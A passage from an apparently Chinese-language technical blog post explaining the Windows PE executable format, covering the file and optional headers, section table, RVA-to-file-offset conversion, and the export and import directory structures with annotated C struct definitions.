指出IMAGE_OPTIONAL_HEADER32结构体的长度。-&gt;  00 E0 -&gt; 224字节</span><br>        <span class="hljs-comment">// PE32+ 格式文件中使用的是IMAGE_OPTIONAL_HEADER64结构体，</span><br>        <span class="hljs-comment">// 这两个结构体尺寸是不相同的，所以需要在SizeOfOptionalHeader中指明大小。</span><br><br>        WORD    Characteristics;      <br>        <span class="hljs-comment">// 标识文件的属性，二进制中每一位代表不同属性 -&gt; 0F 01</span><br>    <br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br></code></pre></td></tr></table></figure><ul><li><p><code>Machine</code>字段</p><ul><li>指明程序能够运行的CPU型号(运行平台)：</li><li><strong>0x0000</strong> 任何处理器; <strong>0x0014C</strong> x86及后续处理器</li></ul></li><li><p><code>NumberOfSections</code>字段</p><ul><li>文件中存在的节区的总数，如果要新增节或者合并节，就要修改这个值</li></ul></li><li><p><strong>TimeDateStamp</strong>字段</p><ul><li>时间戳：文件的创建时间(和操作系统的创建时间无关)，编译器填写的</li></ul></li><li><p><code>SizeOfOptionalHeader</code>字段</p><ul><li>指出可选PE头(IMAGE_OPTIONAL_HEADER)的大小，32位PE文件默认<strong>E0h</strong>，64位PE文件默认为<strong>F0h</strong>，大小可以自定义</li></ul></li><li><p><code>Characteristics</code>字段</p><ul><li>文件属性，每个位(十六进制转化为二进制)有不同的含义，可执行文件值为10F 即0 1 2 3 8位置1</li></ul></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304020940369.png" alt="202301121638095" /></p><h3 id="image_optional_header"><a class="markdownIt-Anchor" href="#image_optional_header"></a> IMAGE_OPTIONAL_HEADER</h3><p>​<strong>NT头：可选头</strong>，32位下大小为<strong>E0h</strong>个字节，64位下大小为<strong>F0h</strong>个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_OPTIONAL_HEADER</span> &#123;</span> <br>        WORD    Magic;                     <br>        <span class="hljs-comment">// 魔数 32位为0x10B，64位为0x20B，ROM镜像为0x107&#x27;</span><br>        BYTE    MajorLinkerVersion;         <br>        <span class="hljs-comment">// 链接器的主版本号 -&gt; 05</span><br>        BYTE    MinorLinkerVersion;         <br>        <span class="hljs-comment">// 链接器的次版本号 -&gt; 0C</span><br>        DWORD   SizeOfCode;                 <br>        <span class="hljs-comment">// 代码节大小，一般放在“.text”节里，必须是FileAlignment的整数倍 -&gt; 40 00 04 00</span><br>        DWORD   SizeOfInitializedData;      <br>        <span class="hljs-comment">// 已初始化数大小，一般放在“.data”节里，必须是FileAlignment的整数倍 -&gt; 40 00 0A 00</span><br>        DWORD   SizeOfUninitializedData;    <br>        <span class="hljs-comment">// 未初始化数大小，一般放在“.bss”节里，必须是FileAlignment的整数倍 -&gt; 00 00 00 00</span><br>        DWORD   AddressOfEntryPoint;       <br>        <span class="hljs-comment">// 指出程序最先执行的代码起始地址(RVA) -&gt; 00 00 10 00&#x27;</span><br>        DWORD   BaseOfCode;                 <br>        <span class="hljs-comment">// 代码基址，当镜像被加载进内存时代码节的开头RVA。必须是SectionAlignment的整数倍 -&gt; 40 00 10 00</span><br> <br>        DWORD   BaseOfData;                 <br>        <span class="hljs-comment">// 数据基址，当镜像被加载进内存时数据节的开头RVA。必须是SectionAlignment的整数倍 -&gt; 40 00 20 00</span><br>        <span class="hljs-comment">// 在64位文件中此处被并入紧随其后的ImageBase中。</span><br> <br>        DWORD   ImageBase;                 <br>        <span class="hljs-comment">// 当加载进内存时，镜像的第1个字节的首选地址。</span><br>        <span class="hljs-comment">// WindowEXE默认ImageBase值为00400000，DLL文件的ImageBase值为10000000，也可以指定其他值。</span><br>        <span class="hljs-comment">// 执行PE文件时，PE装载器先创建进程，再将文件载入内存，</span><br>        <span class="hljs-comment">// 然后把EIP寄存器的值设置为ImageBase+AddressOfEntryPoint&#x27;</span><br>        <span class="hljs-comment">// PE文件的Body部分被划分成若干节段，这些节段储存着不同类别的数据。</span><br>        DWORD   SectionAlignment;          <br>        <span class="hljs-comment">// SectionAlignment指定了节段在内存中的最小单位， -&gt; 00 00 10 00&#x27;</span><br>        DWORD   FileAlignment;             <br>        <span class="hljs-comment">// FileAlignment指定了节段在磁盘文件中的最小单位，-&gt; 00 00 02 00</span><br>        <span class="hljs-comment">// SectionAlignment必须大于或者等于FileAlignment&#x27;</span><br> <br>        WORD    MajorOperatingSystemVersion;<span class="hljs-comment">// 主系统的主版本号 -&gt; 00 04</span><br>        WORD    MinorOperatingSystemVersion;<span class="hljs-comment">// 主系统的次版本号 -&gt; 00 00</span><br>        WORD    MajorImageVersion;          <span class="hljs-comment">// 镜像的主版本号 -&gt; 00 00</span><br>        WORD    MinorImageVersion;          <span class="hljs-comment">// 镜像的次版本号 -&gt; 00 00</span><br>        WORD    MajorSubsystemVersion;      <span class="hljs-comment">// 子系统的主版本号 -&gt; 00 04</span><br>        WORD    MinorSubsystemVersion;      <span class="hljs-comment">// 子系统的次版本号 -&gt; 00 00</span><br>        DWORD   Win32VersionValue;          <span class="hljs-comment">// 保留，必须为0 -&gt; 00 00 00 00</span><br> <br>        DWORD   SizeOfImage;               <br>        <span class="hljs-comment">// 当镜像被加载进内存时的大小，包括所有的文件头。向上舍入为SectionAlignment的倍数。</span><br>        <span class="hljs-comment">// 一般文件大小与加载到内存中的大小是不同的。 -&gt; 00 00 50 00&#x27;</span><br> <br>        DWORD   SizeOfHeaders;             <br>        <span class="hljs-comment">// 所有头的总大小，向上舍入为FileAlignment的倍数。                                     </span><br>        <span class="hljs-comment">// 可以以此值作为PE文件第一节的文件偏移量。-&gt; 00 00 04 00&#x27;</span><br> <br>        DWORD   CheckSum;                   <span class="hljs-comment">// 镜像文件的校验和 -&gt; 00 00 B4 99</span><br> <br>        WORD    Subsystem;                 <br>        <span class="hljs-comment">// 运行此镜像所需的子系统 -&gt; 00 02 -&gt; 窗口应用程序</span><br>        <span class="hljs-comment">// 用来区分系统驱动文件(*.sys)与普通可执行文件(*.exe，*.dll)，</span><br><br> <br>        WORD    DllCharacteristics;         <span class="hljs-comment">// DLL标识 -&gt; 00 00</span><br>        DWORD   SizeOfStackReserve;         <span class="hljs-comment">// 最大栈大小。CPU的堆栈。默认是1MB。-&gt; 00 10 00 00</span><br>        DWORD   SizeOfStackCommit;          <span class="hljs-comment">// 初始提交的堆栈大小。默认是4KB -&gt; 00 00 10 00</span><br>        DWORD   SizeOfHeapReserve;          <span class="hljs-comment">// 最大堆大小。编译器分配的。默认是1MB -&gt;00 10 00 00</span><br>        DWORD   SizeOfHeapCommit;           <span class="hljs-comment">// 初始提交的局部堆空间大小。默认是4K -&gt;00 00 10 00</span><br>        DWORD   LoaderFlags;                <span class="hljs-comment">// 保留，必须为0 -&gt; 00 00 00 00</span><br> <br>        DWORD   NumberOfRvaAndSizes;       <br>        <span class="hljs-comment">// 指定DataDirectory的数组个数，由于以前发行的Windows NT的原因，它只能为16。 -&gt; 00 00 00 10&#x27;</span><br>        IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <br>        <span class="hljs-comment">// 数据目录数组。详见下文。</span><br>    <br>&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br> <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DATA_DIRECTORY</span> &#123;</span>  <br>    DWORD   VirtualAddress;  <br>    DWORD   Size;  <br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br></code></pre></td></tr></table></figure><ul><li><code>Magic</code>字段<ul><li>说明文件类型：</li><li>32位下的PE文件–<strong>10B</strong>， 64位下的PE文件–<strong>20B</strong></li></ul></li><li><strong>SizeOfCode</strong>字段<ul><li>所有代码节的和，必须是FileAlignment的整数倍  编译器填的</li></ul></li><li><strong>SizeOfInitializedData</strong>字段<ul><li>已初始化数据大小的和，必须是FileAlignment的整数倍  编译器填的</li></ul></li><li><strong>SizeOfUninitializedData</strong>字段<ul><li>未初始化数据大小的和，必须是FileAlignment的整数倍  编译器填的</li></ul></li><li><code>AddressOfEntryPoint</code>字段<ul><li>程序入口—AddressOfEntryPoint持有EP的RVA值。该值指出程序最先执行的代码起始地址。</li></ul></li><li><strong>BaseOfCode</strong>字段<ul><li>代码开始的基址，编译器填的</li></ul></li><li><strong>BaseOfData</strong>字段<ul><li>数据开始的基址，编译器填的</li></ul></li><li><code>ImageBase</code>字段<ul><li>内存镜像基址。进程虚拟内存的范围是0000 0000 ~ FFFF FFFF(32位系统)。PE文件被加载到内存中时，ImageBase 指出文件的优先装入地址。</li><li>EXE、DLL文件被装载到用户内存的0000 0000 ~ 7FFF FFFF中，SYS文件被载入内核内存的8000 0000 ~ FFFF FFFF中。一般而言，使用开发攻击(VB/VC++/Dephi)创建好EXE文件后，其执行PR文件时，PE装载器先创建进程，再将文件载入内存，然后把EIP寄存器的值设置为 <strong>ImageBase + AddressOfEntryPoint</strong></li></ul></li><li><code>SectionAlignment</code>字段<ul><li>内存对齐—节区在内存中的最小单位</li></ul></li><li><code>FileAlignment</code>字段<ul><li>文件对齐—节区再磁盘文件中的最小单位</li></ul></li><li><code>SizeOfImage</code>字段<ul><li>内存中整个PE文件的映射的尺寸，可以比实际的值大，但必须是SectionAlignment的整数倍</li></ul></li><li><code>SizeOfHeaders</code>字段<ul><li>所有头与节表按照<strong>文件对齐</strong>后的大小，否则加载会出错</li><li>指出整个PE头的大小[ DOS + NT( NT + File + Optional ) ]。该值也是FileAlignment的整数倍。第一节区所在位置与SizeOfHeader距文件开始偏移的量相同</li></ul></li><li><strong>CheckSum</strong>字段<ul><li>校验和，一些系统文件有要求.用来判断文件是否被修改</li></ul></li><li><strong>SizeOfStackReserve</strong>字段<ul><li>初始化时保留的堆栈大小</li></ul></li><li><strong>SizeOfStackCommit</strong>字段<ul><li>初始化时实际提交的大小</li></ul></li><li><strong>SizeOfHeapReserve</strong>字段<ul><li>初始化时保留的堆大小</li></ul></li><li><strong>SizeOfHeapCommit</strong>字段<ul><li>初始化时实践提交的大小</li></ul></li><li><code>NumberOfRvaAndSizes</code>字段<ul><li>目录项数目</li><li>指出Data_Directory(IMAGE_OPTIONAL_HEADER32结构体的最后一个成员)数组的个数。</li></ul></li><li><code>Data_Directory</code>字段<ul><li>数据目录表，由NumberOfRvaAndSize个IMAGE_DATA_DIRECTORY结构体组成的数组。该数组包含输入表，输出表，资源，重定位等数据目录项的RVA和大小。</li></ul></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304020950878.png" alt="202302242139607" /></p><h2 id="节区头节表"><a class="markdownIt-Anchor" href="#节区头节表"></a> 节区头(节表)</h2><p><strong>IMAGE_SECTION_HEADER</strong></p><p>​在PE文件头与原始数据之间存在一个区块表(Section Table)，它是一个IMAGE_SECTION_HEADER结构数组，<code>区块表包含每个块在映像中的信息</code>(如位置、长度、属性)，分别指向不同的区块实体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_SECTION_HEADER</span> &#123;</span><br>    Name<span class="hljs-comment">//8个字节的块名</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        DWORD PhysicalAddress;<br>        DWORD VirtualSize;<br>    &#125; Misc;                     <span class="hljs-comment">//区块尺寸(真实)</span><br>    DWORD VirtualAddress;<span class="hljs-comment">//区块的RVA地址</span><br>    DWORD SizeOfRawData;<span class="hljs-comment">//在文件中对齐后的尺寸</span><br>    DWORD PointerToRawData;<span class="hljs-comment">//在文件中偏移</span><br>    DWORD PointerToRelocations;<span class="hljs-comment">//在OBJ文件中使用，重定位的偏移</span><br>    DWORD PointerToLinenumbers;<span class="hljs-comment">//行号表的偏移(供调试使用地)</span><br>    WORD NumberOfRelocations;<span class="hljs-comment">//在OBJ文件中使用，重定位项数目</span><br>    WORD NumberOfLinenumbers;<span class="hljs-comment">//行号表中行号的数目</span><br>    DWORD Characteristics;<span class="hljs-comment">//区块属性如可读，可写，可执行等</span><br>&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;<br></code></pre></td></tr></table></figure><ul><li><p><code>Name</code></p><ul><li><strong>8个字节</strong> 一般情况下是以&quot;\0&quot;结尾的ASCII吗字符串来标识的名称，内容可以自定义</li></ul></li><li><p><code>Misc</code></p><ul><li><strong>双字</strong> 是该节在没有对齐前的真实尺寸,该值可以不准确</li></ul></li><li><p><code>VirtualSize</code></p><ul><li>内存中节区所占大小</li></ul></li><li><p><code>VirtualAddress</code></p><ul><li>节区在<strong>内存中</strong>的偏移地址(RVA)。加上ImageBase才是在内存中的真正地址。由SectionAlignment确定</li></ul></li><li><p><code>SizeOfRawData</code></p><ul><li>节区在<strong>文件中</strong>对齐后的尺寸—磁盘文件中节区所占大小</li></ul></li><li><p><code>PointerToRawData</code></p><ul><li>节区在<strong>文件中</strong>的偏移—磁盘文件中节区的起始位置。由FileAlignment确定</li></ul></li><li><p><code>Characteristics</code></p><ul><li><p>节区属性(bit OR)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291128040.png" alt="202302242144521" /></p></li></ul></li></ul><h1 id="rva-to-raw"><a class="markdownIt-Anchor" href="#rva-to-raw"></a> RVA to RAW</h1><p>​PE文件从磁盘到内存映射—PE文件加载到内存时，每个节区都要能准确完成内存地址与文件偏移间的映射(RVA to RAW).方法如下：</p><ol><li><p>查早RVA所在节区</p></li><li><p>使用简单的公式计算文件偏移(RAW/FOA)</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>R</mi><mi>A</mi><mi>W</mi><mo stretchy="false">(</mo><mi>F</mi><mi>O</mi><mi>A</mi><mo stretchy="false">)</mo><mo>−</mo><mi>P</mi><mi>o</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>T</mi><mi>o</mi><mi>R</mi><mi>a</mi><mi>w</mi><mi>D</mi><mi>a</mi><mi>t</mi><mi>a</mi><mo>=</mo><mi>R</mi><mi>V</mi><mi>A</mi><mo>−</mo><mi>V</mi><mi>i</mi><mi>r</mi><mi>t</mi><mi>u</mi><mi>a</mi><mi>l</mi><mi>A</mi><mi>d</mi><mi>d</mi><mi>r</mi><mi>e</mi><mi>s</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">RAW(FOA) - PointerToRawData = RVA - VirtualAddress</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">o</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mord mathnormal">u</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span></span></span></span></span></p><p>PointerToRawData：<strong>磁盘文件中</strong>节区的起始位置。由FileAlignment确定</p><p>virtualAddress：<strong>内存中</strong>节区起始地址(RVA)</p></li></ol><h1 id="数据目录"><a class="markdownIt-Anchor" href="#数据目录"></a> 数据目录</h1><ul><li><p><strong>引用：</strong></p><ul><li><p><a href="https://blog.csdn.net/qq_35289660/category_9995600.html">PE文件结构_C4cke的博客-CSDN博客</a></p></li><li><p><a href="https://www.anquanke.com/member.html?memberId=156165">深度理解win32</a></p></li></ul></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291128802.png" alt="202302261105566" /></p><h2 id="导出表"><a class="markdownIt-Anchor" href="#导出表"></a> 导出表</h2><p>​**基本概念：**导出表是PE文件为其他应用程序提供自身的一些变量、函数以及类，将其导出给第三方程序使用的一张清单，里面包含了可以导出的元素。位于数据目录项的第一个结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DATA_DIRECTORY</span> &#123;</span><br>DWORD VirtualAddress;<br>DWORD Size;<br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br></code></pre></td></tr></table></figure><ul><li><code>VirtualAddress</code>：真正导出表的RVA</li><li><code>Size</code>：导出表的大小，在这个地方的结构只是说明了导出表在<strong>内存中</strong>所存在的地址以及导出表的大小，并不是真正的导出表，需要通过RVA去找到导出表真正存在的地址</li></ul><h3 id="image_export_directory"><a class="markdownIt-Anchor" href="#image_export_directory"></a> IMAGE_EXPORT_DIRECTORY</h3><p>真正的导出表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br>    DWORD Characteristics; <span class="hljs-comment">// 未使用</span><br>    DWORD TimeDateStamp; <span class="hljs-comment">// 时间戳</span><br>    WORD MajorVersion; <span class="hljs-comment">// 未使用</span><br>    WORD MinorVersion; <span class="hljs-comment">// 未使用</span><br>    DWORD Name;     <span class="hljs-comment">// 指向该导出表文件名字符串</span><br>    DWORD Base;     <span class="hljs-comment">// 导出函数起始序号</span><br>    DWORD NumberOfFunctions;  <span class="hljs-comment">// 所有导出函数的个数</span><br>    DWORD NumberOfNames;  <span class="hljs-comment">// 以函数名字导出的函数个数</span><br>    DWORD AddressOfFunctions;  <span class="hljs-comment">// 导出函数地址表RVA</span><br>    DWORD AddressOfNames;  <span class="hljs-comment">// 导出函数名称表RVA</span><br>    DWORD AddressOfNameOrdinals;  <span class="hljs-comment">// 导出函数序号表RVA</span><br>&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;<br></code></pre></td></tr></table></figure><ul><li><p>导出表导出方式为两种，分别是以<strong>名字导出</strong>、以<strong>序号导出</strong>：</p></li><li><p>**AddressOfFunctions、AddressOfNames、AddressOfNameOrdinal **这三个RVA指向的是三个存放了函数具体地址的表，如下图所示</p><ul><li><strong>AddressOfFunctions</strong>存放的地址数量由NumberOfFuntions决定，</li><li><strong>AddressOfNameOrdinals</strong>和<strong>AddressOfNames</strong>存放的地址数量由NumberOfNames来决定</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291128759.png" alt="202302261031945" /></p></li></ul><h4 id="addressofnames"><a class="markdownIt-Anchor" href="#addressofnames"></a> AddressOfNames</h4><ul><li>这个表里面的宽度为4字节，即0x12345678，存放的地址也为RVA，在这个表里面，名称是按字符顺序排序的<ul><li><p>例如有一个函数名称为apple，另外一个函数名称为bee，那么apple的RVA就在这个表里面的第一项，bee的RVA就在这个表里面的第二项，但是这个可能并不是函数真正的名字，如下图所示</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291128671.png" alt="202302261034484" /></p></li></ul></li></ul><h4 id="addressofnameordinals"><a class="markdownIt-Anchor" href="#addressofnameordinals"></a> AddressOfNameOrdinals</h4><ul><li>这个表里面的宽度为2字节，存放的地址也为RVA，通过这个表里面的内容加上Base就可以得到函数的导出序号</li></ul><h4 id="addressoffunctions"><a class="markdownIt-Anchor" href="#addressoffunctions"></a> AddressOfFunctions</h4><ul><li>这个表里面的宽度也是4字节，存放的是所有导出函数的地址，这个地址也是RVA，所以要想得到真正的地址需要加上ImageBase</li></ul><h3 id="导出方式"><a class="markdownIt-Anchor" href="#导出方式"></a> 导出方式</h3><ul><li>以名字导出<ul><li>首先遍历名字表(AddressOfNames)，用名字表中的地址找字符串，与目标字符串比对。如果找到字符串一样的，得到该处的索引。按照相同的索引号从序号表中找到序号值(即<strong>名字表与序号表的下标相同</strong>)，再通过序号值(序号表中的value)为索引，从地址表中找到目标函数的地址(RVA)，之后这个地址需要加上ImagBase，即可得到真正导出函数的地址</li></ul></li><li>以序号导出<ul><li>用目标序号-BASE，得到一个值，直接用这个值为索引，从地址表中找函数的地址(RVA)，之后这个地址需要加上ImagBase，即可得到真正导出函数的地址</li></ul></li></ul><h2 id="导入表"><a class="markdownIt-Anchor" href="#导入表"></a> 导入表</h2><p>​**基本概念：**导入表是记录PE文件中用到的动态连接库的集合，一个dll库在导入表中占用一个元素信息的位置，这个元素描述了该导入dll的具体信息。如dll的最新修改时间、dll中函数的名字/序号、dll加载后的函数地址等。</p><blockquote><p>补充：DLL</p></blockquote><p>​DLL(Dynamic Linked Library)----动态链接库</p><p>DLL概念：</p><ul><li>不把库包含到程序中，单独组成DLL文件，需要时调用即可</li><li>内存映射技术使加载后的DLL代码、资源在多个进程中实现共享</li><li>更新库时只要替换相关文件即可，简便易行</li></ul><p>DLL加载：</p><ol><li>显示链接：程序使用DLL时加载，使用完毕后释放内存；</li><li>隐式链接：程序开始时即一同加载DLL，程序终止时再释放占用的内存</li></ol><p><strong>IAT提供的机制即与隐式链接有关</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DATA_DIRECTORY</span> &#123;</span><br>    DWORD   VirtualAddress;<br>    DWORD   Size;<br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br></code></pre></td></tr></table></figure><ul><li><code>VirtualAddress</code>：指向真正导入表结构的RVA</li><li><code>Size</code>：导入表的大小</li></ul><h3 id="image_import_descriptor"><a class="markdownIt-Anchor" href="#image_import_descriptor"></a> IMAGE_IMPORT_DESCRIPTOR</h3><p>​IMAGE_IMPORT_DESCRIPTOR结构体中记录着PE文件要导入哪些库文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   Characteristics;            <span class="hljs-comment">//导入表结束标志</span><br>        DWORD   OriginalFirstThunk;         <span class="hljs-comment">//RVA 指向IMAGE_THUNK_DATA结构体数组(INT表)</span><br>    &#125;;<br>    DWORD   TimeDateStamp;                  <span class="hljs-comment">//时间戳</span><br>    DWORD   ForwarderChain;                 <span class="hljs-comment">// -1 if no forwarders</span><br>    DWORD   Name;                           <span class="hljs-comment">//RVA指向dll名字，以0结尾</span><br>    DWORD   FirstThunk;                     <span class="hljs-comment">//RVA 指向IMAGE_THUNK_DATA结构体数组(IAT表)</span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br><span class="hljs-keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><p>​执行一个普通程序往往需要导入多个库，导入多少库就存在多少个 <strong>IMAGE_IMPORT_DESCRIPTOR结构体</strong>，这些结构体组成了数组，且结构体数组最后以NULL结束。</p><ul><li><code>OriginalFirstThunk</code><ul><li>该字段保存了指向**导入函数名称(序号)**的 RVA 表(<strong>INT表</strong>)，这个表其实是一个 IMAGE_THUNK_DATA结构体</li></ul></li><li><code>Name</code><ul><li>RVA，指向dll名字(库名称字符串的地址)，该名字以 0 结尾</li></ul></li><li><code>FirstThunk</code><ul><li>RVA，指向IMAGE_THUNK_DATA结构数组，即<strong>指向IAT表</strong></li><li>该字段保存了指向导入地址表的 RVA，在 <strong>PE 文件没有被装载前</strong>它的内容与 OriginalFirstThunk 指向相同的内容，也就是在 PE 文件没有被装载前它也指向 IMAGE_THUNK_ DATA 结构体。</li><li>当<strong>被 Windows 操作系统装入内存后</strong>，它的值则发生了变化，被装载入内存后，这里保存了导入函数实际地址</li></ul></li></ul><h4 id="originalfirstthunk"><a class="markdownIt-Anchor" href="#originalfirstthunk"></a> OriginalFirstThunk</h4><ul><li><strong>OriginalFirstThunk</strong>这个RVA所指向的是INT表(Import Name Table)，这个表每个数据占4个字节。顾名思义就是表示要导入的函数的名字表</li><li><code>INT</code>：<ul><li>如果这个4字节数的最高位(二进制)为1，那么抹去这个最高位之后，所表示的数就是要导入的函数的序号；</li><li>如果最高位是0，那这个数就也是一个RVA，指向IMAGE_IMPORT_BY_NAME结构体(包含真正的导入函数的名字字符串，以0结尾)。INT表以4字节0结尾。</li></ul></li><li><code>IMAGE_IMPORT_BY_NAME</code>：前两个字节是一个序号，不是导入序号，一般无用，后面接着就是导入函数名字的字符串，以0结尾。</li></ul><h4 id="name"><a class="markdownIt-Anchor" href="#name"></a> 